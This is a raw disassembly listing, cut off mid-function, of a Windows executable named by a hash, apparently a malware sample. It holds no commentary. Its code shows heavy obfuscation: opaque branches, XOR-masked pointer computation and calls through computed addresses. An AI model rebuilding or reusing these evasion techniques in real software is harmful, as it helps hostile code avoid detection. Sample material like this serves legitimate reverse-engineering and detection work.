
7e0ab76a0395a3463dcc2a3ce720496f0e6650d36ecff49698551deda7fcdf33.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x34
  401006:	push   esi
  401007:	push   edi
  401008:	push   ebx
  401009:	mov    ecx,DWORD PTR [ebp+0xc]
  40100c:	movzx  esi,cx
  40100f:	mov    edx,DWORD PTR [ebp+0x8]
  401012:	movzx  esi,dx
  401015:	cmp    esi,0xffff
  40101b:	jne    0x401024
  40101d:	mov    eax,esi
  40101f:	jmp    0x401261
  401024:	mov    ecx,DWORD PTR [ebp+0x8]
  401027:	add    ecx,DWORD PTR [ebp+0x8]
  40102a:	mov    edi,ecx
  40102c:	cmp    edi,0xffffffff
  40102f:	jne    0x401038
  401031:	mov    eax,esi
  401033:	jmp    0x401261
  401038:	mov    ecx,edi
  40103a:	xor    ecx,0x1f9f
  401040:	mov    ebx,ecx
  401042:	mov    eax,DWORD PTR [ebp+0xc]
  401045:	or     eax,0xd0000000
  40104a:	mov    ebx,eax
  40104c:	cmp    edi,0xffffffff
  40104f:	jne    0x401058
  401051:	mov    eax,edi
  401053:	jmp    0x401261
  401058:	mov    eax,edi
  40105a:	xor    eax,esi
  40105c:	sub    eax,0x70884535
  401061:	mov    ecx,0x8f35fdbb
  401066:	xor    ecx,eax
  401068:	mov    DWORD PTR [ebp-0x4],ecx
  40106b:	mov    eax,esi
  40106d:	shl    eax,0x8
  401070:	mov    DWORD PTR [ebp-0x8],eax
  401073:	cmp    ebx,0xd0000015
  401079:	je     0x401084
  40107b:	mov    edx,esi
  40107d:	mov    eax,edx
  40107f:	jmp    0x401261
  401084:	mov    ecx,ebx
  401086:	imul   ecx,esi
  401089:	sub    ecx,0xa1ca270e
  40108f:	mov    edx,0x5e7648e2
  401094:	xor    edx,ecx
  401096:	mov    DWORD PTR [ebp-0xc],edx
  401099:	mov    edi,ebx
  40109b:	mov    eax,ebx
  40109d:	and    eax,edi
  40109f:	add    eax,0x2fffffeb
  4010a4:	mov    ecx,DWORD PTR [ebp-0xc]
  4010a7:	mov    eax,DWORD PTR [ecx+eax*4]
  4010aa:	mov    DWORD PTR [ebp-0x10],eax
  4010ad:	mov    eax,edi
  4010af:	xor    edx,edx
  4010b1:	div    ebx
  4010b3:	mov    ebx,edx
  4010b5:	mov    ecx,ebx
  4010b7:	add    ecx,edi
  4010b9:	add    ecx,0x2fffffec
  4010bf:	mov    DWORD PTR [ebp-0x14],ecx
  4010c2:	mov    eax,DWORD PTR [ebp+0xc]
  4010c5:	sub    eax,0x63fd
  4010ca:	movzx  esi,ax
  4010cd:	cmp    edi,0xd0000015
  4010d3:	jge    0x4010db
  4010d5:	call   DWORD PTR ds:0x42208c
  4010db:	mov    eax,DWORD PTR [ebp-0x14]
  4010de:	test   eax,eax
  4010e0:	je     0x40120f
  4010e6:	mov    BYTE PTR [ebp-0x18],0xbc
  4010ea:	movzx  edx,BYTE PTR [ebp-0x18]
  4010ee:	or     edx,0xe554
  4010f4:	mov    WORD PTR [ebp-0x1c],dx
  4010f8:	cmp    BYTE PTR [ebp-0x18],0xbc
  4010fc:	je     0x40111a
  4010fe:	movzx  ecx,WORD PTR [ebp-0x1c]
  401102:	movzx  edx,BYTE PTR [ebp-0x18]
  401106:	xor    ecx,edx
  401108:	push   ecx
  401109:	movzx  edx,WORD PTR [ebp-0x1c]
  40110d:	imul   edx,edx,0x5a4800
  401113:	push   edx
  401114:	call   DWORD PTR ds:0x422050
  40111a:	cmp    BYTE PTR [ebp-0x18],0xbc
  40111e:	je     0x40112b
  401120:	movzx  ecx,WORD PTR [ebp-0x1c]
  401124:	mov    eax,ecx
  401126:	jmp    0x401261
  40112b:	mov    eax,DWORD PTR [ebp+0xc]
  40112e:	movzx  edx,BYTE PTR [ebp-0x18]
  401132:	imul   eax,edx
  401135:	mov    DWORD PTR [ebp-0x20],eax
  401138:	cmp    DWORD PTR [ebp-0x20],0xf6c
  40113f:	jge    0x40114c
  401141:	movzx  ecx,WORD PTR [ebp-0x1c]
  401145:	mov    eax,ecx
  401147:	jmp    0x401261
  40114c:	mov    edx,DWORD PTR [ebp-0x20]
  40114f:	mov    WORD PTR [ebp-0x24],dx
  401153:	cmp    DWORD PTR [ebp-0x20],0xf6c
  40115a:	je     0x401167
  40115c:	movzx  ecx,BYTE PTR [ebp-0x18]
  401160:	mov    eax,ecx
  401162:	jmp    0x401261
  401167:	mov    edx,DWORD PTR [ebp+0xc]
  40116a:	mov    WORD PTR [ebp-0x24],dx
  40116e:	movzx  eax,WORD PTR [ebp-0x24]
  401172:	movzx  ecx,BYTE PTR [ebp-0x18]
  401176:	sub    eax,ecx
  401178:	add    eax,0xa7
  40117d:	mov    ecx,DWORD PTR [ebp-0x4]
  401180:	movzx  edx,BYTE PTR [ecx]
  401183:	mov    ecx,DWORD PTR [ebp-0x10]
  401186:	mov    BYTE PTR [ecx+eax*1],dl
  401189:	mov    ecx,DWORD PTR [ebp+0x8]
  40118c:	and    ecx,0xcf00
  401192:	movzx  eax,WORD PTR [ebp-0x1c]
  401196:	add    eax,ecx
  401198:	mov    WORD PTR [ebp-0x24],ax
  40119c:	movzx  edx,WORD PTR [ebp-0x24]
  4011a0:	movzx  ecx,BYTE PTR [ebp-0x18]
  4011a4:	xor    edx,ecx
  4011a6:	sub    edx,0xe53f
  4011ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4011af:	add    ecx,edx
  4011b1:	mov    DWORD PTR [ebp-0x10],ecx
  4011b4:	movzx  ecx,WORD PTR [ebp-0x24]
  4011b8:	add    ecx,DWORD PTR [ebp+0xc]
  4011bb:	mov    WORD PTR [ebp-0x1c],cx
  4011bf:	mov    ecx,DWORD PTR [ebp-0x4]
  4011c2:	add    ecx,0x1
  4011c5:	mov    DWORD PTR [ebp-0x4],ecx
  4011c8:	mov    ecx,DWORD PTR [ebp-0x20]
  4011cb:	mov    BYTE PTR [ebp-0x28],cl
  4011ce:	cmp    BYTE PTR [ebp-0x28],0x6c
  4011d2:	je     0x4011df
  4011d4:	movzx  edx,WORD PTR [ebp-0x1c]
  4011d8:	mov    eax,edx
  4011da:	jmp    0x401261
  4011df:	movzx  eax,WORD PTR [ebp-0x1c]
  4011e3:	movzx  ecx,WORD PTR [ebp-0x24]
  4011e7:	imul   eax,ecx
  4011ea:	sub    eax,0xceafadbb
  4011ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4011f2:	sub    ecx,eax
  4011f4:	mov    DWORD PTR [ebp-0x14],ecx
  4011f7:	mov    edx,DWORD PTR [ebp+0x8]
  4011fa:	or     edx,0x3400
  401200:	movzx  ecx,WORD PTR [ebp-0x1c]
  401204:	add    ecx,edx
  401206:	mov    WORD PTR [ebp-0x2c],cx
  40120a:	jmp    0x4010db
  40120f:	mov    eax,esi
  401211:	mov    DWORD PTR [ebp-0x30],eax
  401214:	cmp    ebx,0xffffffff
  401217:	jne    0x40121d
  401219:	mov    eax,ebx
  40121b:	jmp    0x401261
  40121d:	mov    eax,DWORD PTR [ebp-0x30]
  401220:	xor    eax,DWORD PTR [ebp-0x8]
  401223:	add    eax,0x5e353cda
  401228:	mov    ecx,0x5e7648e2
  40122d:	xor    ecx,eax
  40122f:	mov    DWORD PTR [ebp-0xc],ecx
  401232:	mov    edx,DWORD PTR [ebp+0x8]
  401235:	xor    edx,0xc0ab5c3
  40123b:	mov    eax,DWORD PTR [ebp+0x8]
  40123e:	imul   eax,edx
  401241:	mov    edi,eax
  401243:	cmp    edi,0x0
  401246:	jge    0x40124f
  401248:	mov    edx,DWORD PTR [ebp-0x30]
  40124b:	mov    eax,edx
  40124d:	jmp    0x401261
  40124f:	mov    eax,DWORD PTR [ebp-0xc]
  401252:	mov    edx,DWORD PTR [ebp-0x10]
  401255:	mov    DWORD PTR [eax],edx
  401257:	mov    edx,ebx
  401259:	shl    edx,0x8
  40125c:	mov    DWORD PTR [ebp-0x34],edx
  40125f:	mov    eax,ebx
  401261:	pop    ebx
  401262:	pop    edi
  401263:	pop    esi
  401264:	mov    esp,ebp
  401266:	pop    ebp
  401267:	ret    0x8
  40126a:	push   ebp
  40126b:	mov    ebp,esp
  40126d:	sub    esp,0x4
  401270:	push   esi
  401271:	push   edi
  401272:	push   ebx
  401273:	mov    esi,0xac69
  401278:	mov    eax,DWORD PTR [ebp+0xc]
  40127b:	movzx  edi,al
  40127e:	mov    eax,DWORD PTR [ebp+0xc]
  401281:	movzx  edi,al
  401284:	mov    ecx,DWORD PTR [ebp+0x8]
  401287:	add    ecx,0xde
  40128d:	sub    ecx,esi
  40128f:	mov    esi,ecx
  401291:	cmp    edi,0xff
  401297:	jne    0x4012a0
  401299:	mov    eax,esi
  40129b:	jmp    0x4013cc
  4012a0:	mov    ecx,edi
  4012a2:	shr    ecx,1
  4012a4:	mov    ebx,ecx
  4012a6:	cmp    esi,0xffff5475
  4012ac:	jge    0x4012d2
  4012ae:	push   esi
  4012af:	mov    ecx,ebx
  4012b1:	and    ecx,0x469b00
  4012b7:	and    ecx,ebx
  4012b9:	push   ecx
  4012ba:	mov    edx,ebx
  4012bc:	xor    edx,0xf0
  4012c2:	mov    eax,ebx
  4012c4:	add    eax,edx
  4012c6:	push   eax
  4012c7:	mov    ecx,esi
  4012c9:	sub    ecx,ebx
  4012cb:	push   ecx
  4012cc:	call   DWORD PTR ds:0x422074
  4012d2:	mov    eax,ebx
  4012d4:	add    eax,0xf3
  4012d9:	mov    esi,eax
  4012db:	cmp    esi,0xf3
  4012e1:	je     0x4012ea
  4012e3:	mov    eax,esi
  4012e5:	jmp    0x4013cc
  4012ea:	mov    eax,esi
  4012ec:	sub    eax,0x2634425e
  4012f1:	mov    BYTE PTR [ebp-0x4],al
  4012f4:	movzx  ecx,BYTE PTR [ebp-0x4]
  4012f8:	movzx  edi,cl
  4012fb:	cmp    ebx,0x0
  4012fe:	jge    0x401307
  401300:	mov    eax,ebx
  401302:	jmp    0x4013cc
  401307:	mov    edx,DWORD PTR [ebp+0xc]
  40130a:	and    edx,0xa56a4a75
  401310:	movzx  edi,dl
  401313:	test   ebx,ebx
  401315:	je     0x401320
  401317:	mov    edx,edi
  401319:	mov    eax,edx
  40131b:	jmp    0x4013cc
  401320:	mov    ecx,edi
  401322:	test   cl,cl
  401324:	jne    0x401334
  401326:	movzx  eax,BYTE PTR [ebp-0x4]
  40132a:	push   eax
  40132b:	push   edi
  40132c:	call   0x40291c
  401331:	movzx  edi,al
  401334:	mov    edx,esi
  401336:	mov    BYTE PTR [ebp-0x4],dl
  401339:	cmp    ebx,0x0
  40133c:	jge    0x401347
  40133e:	movzx  eax,BYTE PTR [ebp-0x4]
  401342:	jmp    0x4013cc
  401347:	movzx  eax,BYTE PTR [ebp-0x4]
  40134b:	shl    eax,0x18
  40134e:	movzx  edi,al
  401351:	cmp    esi,0xf3
  401357:	jge    0x401361
  401359:	movzx  edx,BYTE PTR [ebp-0x4]
  40135d:	mov    eax,edx
  40135f:	jmp    0x4013cc
  401361:	mov    eax,esi
  401363:	xor    edx,edx
  401365:	div    esi
  401367:	mov    ebx,eax
  401369:	mov    ecx,edi
  40136b:	mov    esi,ecx
  40136d:	cmp    esi,0x0
  401370:	jle    0x401376
  401372:	mov    eax,ebx
  401374:	jmp    0x4013cc
  401376:	cmp    ebx,0x1
  401379:	jne    0x40138a
  40137b:	push   edi
  40137c:	push   edi
  40137d:	movzx  eax,BYTE PTR [ebp-0x4]
  401381:	push   eax
  401382:	call   0x402543
  401387:	mov    BYTE PTR [ebp-0x4],al
  40138a:	mov    eax,DWORD PTR [ebp+0x8]
  40138d:	xor    eax,0xa
  401390:	add    eax,edi
  401392:	mov    BYTE PTR [ebp-0x4],al
  401395:	cmp    BYTE PTR [ebp-0x4],0xa
  401399:	jge    0x40139f
  40139b:	mov    eax,esi
  40139d:	jmp    0x4013cc
  40139f:	movzx  ecx,BYTE PTR [ebp-0x4]
  4013a3:	xor    ecx,DWORD PTR [ebp+0xc]
  4013a6:	or     ecx,DWORD PTR [ebp+0xc]
  4013a9:	mov    ebx,ecx
  4013ab:	mov    ecx,ebx
  4013ad:	movzx  edi,cl
  4013b0:	mov    edx,esi
  4013b2:	movzx  edi,dl
  4013b5:	cmp    BYTE PTR [ebp-0x4],0xa
  4013b9:	jle    0x4013bf
  4013bb:	mov    eax,ebx
  4013bd:	jmp    0x4013cc
  4013bf:	mov    eax,esi
  4013c1:	add    eax,0x1
  4013c4:	mov    esi,eax
  4013c6:	movzx  ecx,BYTE PTR [ebp-0x4]
  4013ca:	mov    eax,ecx
  4013cc:	pop    ebx
  4013cd:	pop    edi
  4013ce:	pop    esi
  4013cf:	mov    esp,ebp
  4013d1:	pop    ebp
  4013d2:	ret    0xc
  4013d5:	push   ebp
  4013d6:	mov    ebp,esp
  4013d8:	sub    esp,0x4
  4013db:	push   esi
  4013dc:	push   edi
  4013dd:	push   ebx
  4013de:	mov    esi,0x0
  4013e3:	mov    eax,esi
  4013e5:	shl    eax,0x8
  4013e8:	movzx  edi,ax
  4013eb:	mov    ecx,esi
  4013ed:	or     ecx,edi
  4013ef:	imul   ecx,ecx,0xa7
  4013f5:	movzx  esi,cl
  4013f8:	cmp    edi,0x0
  4013fb:	jge    0x401403
  4013fd:	mov    edx,esi
  4013ff:	mov    eax,edx
  401401:	jmp    0x401475
  401403:	mov    ecx,esi
  401405:	test   cl,cl
  401407:	jne    0x401414
  401409:	push   esi
  40140a:	push   esi
  40140b:	push   edi
  40140c:	call   0x403a4e
  401411:	movzx  esi,al
  401414:	mov    edx,esi
  401416:	xor    edx,DWORD PTR [ebp+0x8]
  401419:	movzx  ebx,dl
  40141c:	mov    ecx,esi
  40141e:	add    ecx,0x27f60000
  401424:	mov    WORD PTR [ebp-0x4],cx
  401428:	cmp    esi,0xde
  40142e:	jle    0x401436
  401430:	mov    ecx,esi
  401432:	mov    eax,ecx
  401434:	jmp    0x401475
  401436:	mov    ecx,edi
  401438:	or     ecx,0x4ff6
  40143e:	or     ecx,DWORD PTR [ebp+0x8]
  401441:	movzx  esi,cl
  401444:	cmp    edi,0x0
  401447:	jge    0x40144f
  401449:	movzx  eax,WORD PTR [ebp-0x4]
  40144d:	jmp    0x401475
  40144f:	mov    edx,ebx
  401451:	or     edx,DWORD PTR [ebp+0x8]
  401454:	or     edx,0x3b44c343
  40145a:	movzx  ebx,dl
  40145d:	cmp    esi,0xfe
  401463:	jge    0x40146b
  401465:	mov    edx,esi
  401467:	mov    eax,edx
  401469:	jmp    0x401475
  40146b:	mov    eax,ebx
  40146d:	sub    eax,0x1
  401470:	movzx  ebx,al
  401473:	mov    eax,edi
  401475:	pop    ebx
  401476:	pop    edi
  401477:	pop    esi
  401478:	mov    esp,ebp
  40147a:	pop    ebp
  40147b:	ret    0x4
  40147e:	push   ebp
  40147f:	mov    ebp,esp
  401481:	sub    esp,0x2c
  401484:	push   esi
  401485:	push   edi
  401486:	push   ebx
  401487:	mov    eax,DWORD PTR [ebp+0xc]
  40148a:	movzx  esi,ax
  40148d:	mov    eax,esi
  40148f:	add    eax,0x40740527
  401494:	movzx  edi,al
  401497:	cmp    esi,0x0
  40149a:	jle    0x4014a3
  40149c:	mov    eax,edi
  40149e:	jmp    0x401786
  4014a3:	mov    ecx,esi
  4014a5:	shl    ecx,0x10
  4014a8:	movzx  ebx,cl
  4014ab:	cmp    ebx,0xff
  4014b1:	jne    0x4014ba
  4014b3:	mov    eax,ebx
  4014b5:	jmp    0x401786
  4014ba:	mov    eax,DWORD PTR [ebp+0xc]
  4014bd:	sub    eax,edi
  4014bf:	mov    WORD PTR [ebp-0x4],ax
  4014c3:	cmp    WORD PTR [ebp-0x4],0xffd9
  4014c8:	jge    0x4014d3
  4014ca:	mov    edx,edi
  4014cc:	mov    eax,edx
  4014ce:	jmp    0x401786
  4014d3:	mov    eax,esi
  4014d5:	movzx  edx,WORD PTR [ebp-0x4]
  4014d9:	imul   eax,edx
  4014dc:	add    eax,0xe84f0a67
  4014e1:	mov    edx,0xe80c9a6b
  4014e6:	xor    edx,eax
  4014e8:	mov    DWORD PTR [ebp-0x8],edx
  4014eb:	mov    edx,esi
  4014ed:	mov    DWORD PTR [ebp-0xc],edx
  4014f0:	mov    ecx,DWORD PTR [ebp-0xc]
  4014f3:	test   ecx,ecx
  4014f5:	je     0x401502
  4014f7:	movzx  edx,WORD PTR [ebp-0x4]
  4014fb:	mov    eax,edx
  4014fd:	jmp    0x401786
  401502:	mov    edx,edi
  401504:	xor    edx,ebx
  401506:	add    edx,0xffffffd9
  401509:	mov    eax,DWORD PTR [ebp-0x8]
  40150c:	mov    eax,DWORD PTR [eax+edx*4]
  40150f:	mov    DWORD PTR [ebp-0x10],eax
  401512:	mov    ecx,DWORD PTR [ebp+0xc]
  401515:	movzx  esi,cx
  401518:	mov    eax,ebx
  40151a:	test   al,al
  40151c:	je     0x401532
  40151e:	push   esi
  40151f:	mov    eax,ebx
  401521:	xor    eax,0x56000000
  401526:	mov    edx,edi
  401528:	sub    edx,eax
  40152a:	push   edx
  40152b:	push   ebx
  40152c:	call   DWORD PTR ds:0x422048
  401532:	mov    edx,esi
  401534:	movzx  ecx,WORD PTR [ebp-0x4]
  401538:	sub    edx,ecx
  40153a:	sub    edx,0xc6097819
  401540:	mov    eax,0x39b6181a
  401545:	xor    eax,edx
  401547:	mov    DWORD PTR [ebp-0x8],eax
  40154a:	mov    ecx,ebx
  40154c:	imul   ecx,ecx
  40154f:	mov    DWORD PTR [ebp-0xc],ecx
  401552:	cmp    ebx,0xff
  401558:	jne    0x401563
  40155a:	mov    edx,edi
  40155c:	mov    eax,edx
  40155e:	jmp    0x401786
  401563:	mov    ecx,esi
  401565:	movzx  eax,WORD PTR [ebp-0x4]
  401569:	add    ecx,eax
  40156b:	sub    ecx,0xffd9
  401571:	mov    edx,DWORD PTR [ebp-0x8]
  401574:	mov    eax,DWORD PTR [edx+ecx*4]
  401577:	mov    DWORD PTR [ebp-0x14],eax
  40157a:	mov    ecx,ebx
  40157c:	sub    ecx,esi
  40157e:	movzx  edi,cl
  401581:	mov    eax,ebx
  401583:	movzx  ecx,WORD PTR [ebp-0x4]
  401587:	or     eax,ecx
  401589:	add    eax,0xffff0027
  40158e:	cmp    DWORD PTR [ebp-0x14],eax
  401591:	je     0x401705
  401597:	mov    edx,DWORD PTR [ebp+0x8]
  40159a:	mov    WORD PTR [ebp-0x18],dx
  40159e:	movzx  ecx,WORD PTR [ebp-0x18]
  4015a2:	mov    DWORD PTR [ebp-0x1c],ecx
  4015a5:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4015a9:	jne    0x4015b6
  4015ab:	movzx  ecx,WORD PTR [ebp-0x18]
  4015af:	mov    eax,ecx
  4015b1:	jmp    0x401786
  4015b6:	movzx  edx,WORD PTR [ebp-0x18]
  4015ba:	shr    edx,1
  4015bc:	mov    DWORD PTR [ebp-0x1c],edx
  4015bf:	cmp    WORD PTR [ebp-0x18],0x0
  4015c4:	jge    0x4015cf
  4015c6:	movzx  eax,WORD PTR [ebp-0x18]
  4015ca:	jmp    0x401786
  4015cf:	movzx  eax,WORD PTR [ebp-0x18]
  4015d3:	shr    eax,1
  4015d5:	mov    WORD PTR [ebp-0x20],ax
  4015d9:	cmp    WORD PTR [ebp-0x18],0xffff
  4015de:	jne    0x4015ea
  4015e0:	mov    edx,DWORD PTR [ebp-0x1c]
  4015e3:	mov    eax,edx
  4015e5:	jmp    0x401786
  4015ea:	movzx  eax,WORD PTR [ebp-0x18]
  4015ee:	movzx  ecx,WORD PTR [ebp-0x20]
  4015f2:	and    eax,ecx
  4015f4:	sub    eax,0x2f43
  4015f9:	mov    WORD PTR [ebp-0x18],ax
  4015fd:	mov    edx,DWORD PTR [ebp-0x1c]
  401600:	movzx  eax,WORD PTR [ebp-0x18]
  401604:	imul   edx,eax
  401607:	mov    ecx,DWORD PTR [ebp-0x10]
  40160a:	mov    eax,DWORD PTR [ecx+edx*4]
  40160d:	movzx  ecx,WORD PTR [ebp-0x20]
  401611:	movzx  edx,WORD PTR [ebp-0x18]
  401615:	imul   ecx,edx
  401618:	sub    ecx,0xff8f7497
  40161e:	xor    eax,ecx
  401620:	mov    DWORD PTR [ebp-0x24],eax
  401623:	movzx  eax,WORD PTR [ebp-0x18]
  401627:	xor    eax,DWORD PTR [ebp-0x1c]
  40162a:	mov    DWORD PTR [ebp-0x28],eax
  40162d:	cmp    WORD PTR [ebp-0x18],0xd0bd
  401633:	jge    0x40163f
  401635:	mov    ecx,DWORD PTR [ebp-0x1c]
  401638:	mov    eax,ecx
  40163a:	jmp    0x401786
  40163f:	mov    edx,DWORD PTR [ebp-0x10]
  401642:	mov    ecx,DWORD PTR [ebp-0x24]
  401645:	mov    DWORD PTR [edx],ecx
  401647:	mov    ecx,DWORD PTR [ebp-0x1c]
  40164a:	mov    WORD PTR [ebp-0x18],cx
  40164e:	cmp    WORD PTR [ebp-0x20],0xffff
  401653:	jne    0x401660
  401655:	movzx  ecx,WORD PTR [ebp-0x20]
  401659:	mov    eax,ecx
  40165b:	jmp    0x401786
  401660:	mov    eax,DWORD PTR [ebp-0x28]
  401663:	movzx  edx,WORD PTR [ebp-0x20]
  401667:	and    eax,edx
  401669:	sub    eax,0xffffffff
  40166c:	mov    ecx,DWORD PTR [ebp-0x10]
  40166f:	mov    edx,DWORD PTR [ecx+eax*4]
  401672:	mov    eax,DWORD PTR [ebp-0x1c]
  401675:	add    eax,DWORD PTR [ebp-0x28]
  401678:	sub    eax,0x6956fc35
  40167d:	xor    edx,eax
  40167f:	mov    DWORD PTR [ebp-0x24],edx
  401682:	mov    eax,DWORD PTR [ebp-0x1c]
  401685:	mov    WORD PTR [ebp-0x20],ax
  401689:	mov    eax,DWORD PTR [ebp-0x10]
  40168c:	mov    ecx,DWORD PTR [ebp-0x24]
  40168f:	mov    DWORD PTR [eax+0x4],ecx
  401692:	movzx  eax,WORD PTR [ebp-0x20]
  401696:	sub    eax,0xf77d
  40169b:	add    eax,DWORD PTR [ebp+0xc]
  40169e:	mov    DWORD PTR [ebp-0x1c],eax
  4016a1:	cmp    WORD PTR [ebp-0x18],0xffff
  4016a6:	jne    0x4016b3
  4016a8:	movzx  edx,WORD PTR [ebp-0x20]
  4016ac:	mov    eax,edx
  4016ae:	jmp    0x401786
  4016b3:	movzx  ecx,WORD PTR [ebp-0x18]
  4016b7:	imul   ecx,DWORD PTR [ebp-0x28]
  4016bb:	add    ecx,0x8
  4016be:	mov    eax,DWORD PTR [ebp-0x10]
  4016c1:	add    eax,ecx
  4016c3:	mov    DWORD PTR [ebp-0x10],eax
  4016c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4016c9:	and    ecx,DWORD PTR [ebp+0x8]
  4016cc:	mov    WORD PTR [ebp-0x20],cx
  4016d0:	cmp    WORD PTR [ebp-0x18],0x0
  4016d5:	jle    0x4016e0
  4016d7:	movzx  eax,WORD PTR [ebp-0x20]
  4016db:	jmp    0x401786
  4016e0:	movzx  eax,WORD PTR [ebp-0x18]
  4016e4:	sub    eax,DWORD PTR [ebp-0x1c]
  4016e7:	sub    eax,0xf77c
  4016ec:	mov    ecx,DWORD PTR [ebp-0x14]
  4016ef:	sub    ecx,eax
  4016f1:	mov    DWORD PTR [ebp-0x14],ecx
  4016f4:	movzx  eax,WORD PTR [ebp-0x18]
  4016f8:	xor    edx,edx
  4016fa:	div    DWORD PTR [ebp-0x1c]
  4016fd:	mov    DWORD PTR [ebp-0x28],eax
  401700:	jmp    0x401581
  401705:	mov    ecx,DWORD PTR [ebp+0x8]
  401708:	xor    ecx,0x7a08
  40170e:	imul   ecx,DWORD PTR [ebp+0x8]
  401712:	movzx  ebx,cl
  401715:	mov    edx,esi
  401717:	test   dx,dx
  40171a:	je     0x401722
  40171c:	mov    ecx,edi
  40171e:	mov    eax,ecx
  401720:	jmp    0x401786
  401722:	mov    edx,esi
  401724:	xor    edx,DWORD PTR [ebp-0xc]
  401727:	add    edx,0xe84f0a67
  40172d:	mov    ecx,0xe80c9a6b
  401732:	xor    ecx,edx
  401734:	mov    DWORD PTR [ebp-0x8],ecx
  401737:	mov    eax,esi
  401739:	mov    ecx,0x4
  40173e:	xor    edx,edx
  401740:	div    ecx
  401742:	movzx  ebx,al
  401745:	cmp    DWORD PTR [ebp-0xc],0x0
  401749:	jle    0x401751
  40174b:	mov    ecx,ebx
  40174d:	mov    eax,ecx
  40174f:	jmp    0x401786
  401751:	mov    ecx,edi
  401753:	imul   ecx,DWORD PTR [ebp-0xc]
  401757:	mov    edx,DWORD PTR [ebp-0x8]
  40175a:	mov    eax,DWORD PTR [edx+ecx*4]
  40175d:	mov    DWORD PTR [ebp-0x8],eax
  401760:	movzx  edx,WORD PTR [ebp-0x4]
  401764:	shr    edx,0x2
  401767:	movzx  esi,dx
  40176a:	cmp    WORD PTR [ebp-0x4],0xffd9
  40176f:	jge    0x401777
  401771:	mov    edx,esi
  401773:	mov    eax,edx
  401775:	jmp    0x401786
  401777:	call   DWORD PTR [ebp-0x8]
  40177a:	mov    ecx,DWORD PTR [ebp+0x8]
  40177d:	mov    WORD PTR [ebp-0x2c],cx
  401781:	mov    edx,DWORD PTR [ebp-0xc]
  401784:	mov    eax,edx
  401786:	pop    ebx
  401787:	pop    edi
  401788:	pop    esi
  401789:	mov    esp,ebp
  40178b:	pop    ebp
  40178c:	ret    0x8
  40178f:	push   ebp
  401790:	mov    ebp,esp
  401792:	sub    esp,0x84
  401798:	push   esi
  401799:	push   edi
  40179a:	push   ebx
  40179b:	mov    esi,DWORD PTR [ebp+0xc]
  40179e:	mov    eax,DWORD PTR [ebp+0x8]
  4017a1:	sub    eax,esi
  4017a3:	movzx  edi,al
  4017a6:	mov    ebx,esi
  4017a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4017ab:	imul   ecx,DWORD PTR [ebp+0xc]
  4017af:	mov    esi,ecx
  4017b1:	cmp    ebx,0xffbd0000
  4017b7:	jge    0x4017c2
  4017b9:	mov    edx,edi
  4017bb:	mov    eax,edx
  4017bd:	jmp    0x401ec1
  4017c2:	mov    edx,edi
  4017c4:	xor    edx,ebx
  4017c6:	add    edx,0xe89209aa
  4017cc:	mov    ecx,0xe80c9a6b
  4017d1:	xor    ecx,edx
  4017d3:	mov    DWORD PTR [ebp-0x4],ecx
  4017d6:	mov    ecx,esi
  4017d8:	imul   ecx,ebx
  4017db:	imul   ecx,DWORD PTR [ebp+0x8]
  4017df:	mov    WORD PTR [ebp-0x8],cx
  4017e3:	mov    edx,ebx
  4017e5:	or     edx,edi
  4017e7:	add    edx,0x42ff43
  4017ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4017f0:	mov    eax,DWORD PTR [ecx+edx*4]
  4017f3:	mov    DWORD PTR [ebp-0xc],eax
  4017f6:	mov    eax,esi
  4017f8:	xor    edx,edx
  4017fa:	div    ebx
  4017fc:	mov    WORD PTR [ebp-0x8],ax
  401800:	cmp    esi,0x89000000
  401806:	jge    0x401811
  401808:	movzx  eax,WORD PTR [ebp-0x8]
  40180c:	jmp    0x401ec1
  401811:	mov    ecx,ebx
  401813:	or     ecx,esi
  401815:	sub    ecx,0xffbd0000
  40181b:	mov    eax,DWORD PTR [ebp-0xc]
  40181e:	sub    eax,ecx
  401820:	mov    DWORD PTR [ebp-0x10],eax
  401823:	mov    eax,DWORD PTR [ebp+0x10]
  401826:	imul   eax,edi
  401829:	add    eax,0x99000000
  40182e:	mov    WORD PTR [ebp-0x8],ax
  401832:	mov    DWORD PTR [ebp-0x14],0x1f648
  401839:	mov    edx,ebx
  40183b:	and    edx,esi
  40183d:	sub    edx,0x89000000
  401843:	cmp    DWORD PTR [ebp-0x14],edx
  401846:	je     0x401e0c
  40184c:	mov    eax,DWORD PTR [ebp+0x10]
  40184f:	mov    WORD PTR [ebp-0x18],ax
  401853:	movzx  ecx,WORD PTR [ebp-0x18]
  401857:	xor    ecx,0x747d8262
  40185d:	add    ecx,DWORD PTR [ebp+0x8]
  401860:	mov    WORD PTR [ebp-0x18],cx
  401864:	mov    ecx,DWORD PTR [ebp+0x10]
  401867:	movzx  eax,WORD PTR [ebp-0x18]
  40186b:	and    ecx,eax
  40186d:	mov    DWORD PTR [ebp-0x1c],ecx
  401870:	cmp    DWORD PTR [ebp-0x14],0x8
  401874:	jge    0x401994
  40187a:	mov    BYTE PTR [ebp-0x20],0x46
  40187e:	movzx  ecx,BYTE PTR [ebp-0x20]
  401882:	sub    ecx,0x93be0795
  401888:	mov    BYTE PTR [ebp-0x20],cl
  40188b:	cmp    BYTE PTR [ebp-0x20],0xb1
  40188f:	je     0x40189a
  401891:	movzx  eax,BYTE PTR [ebp-0x20]
  401895:	jmp    0x401ec1
  40189a:	movzx  edx,BYTE PTR [ebp-0x20]
  40189e:	or     edx,DWORD PTR [ebp+0xc]
  4018a1:	movzx  ecx,BYTE PTR [ebp-0x20]
  4018a5:	imul   edx,ecx
  4018a8:	mov    DWORD PTR [ebp-0x24],edx
  4018ab:	cmp    BYTE PTR [ebp-0x20],0xb1
  4018af:	je     0x4018bc
  4018b1:	movzx  edx,BYTE PTR [ebp-0x20]
  4018b5:	mov    eax,edx
  4018b7:	jmp    0x401ec1
  4018bc:	mov    edx,DWORD PTR [ebp-0x24]
  4018bf:	shl    edx,0x8
  4018c2:	mov    BYTE PTR [ebp-0x28],dl
  4018c5:	cmp    BYTE PTR [ebp-0x28],0xff
  4018c9:	jne    0x4018d6
  4018cb:	movzx  edx,BYTE PTR [ebp-0x28]
  4018cf:	mov    eax,edx
  4018d1:	jmp    0x401ec1
  4018d6:	mov    edx,DWORD PTR [ebp-0x24]
  4018d9:	xor    edx,0xdc69c5e7
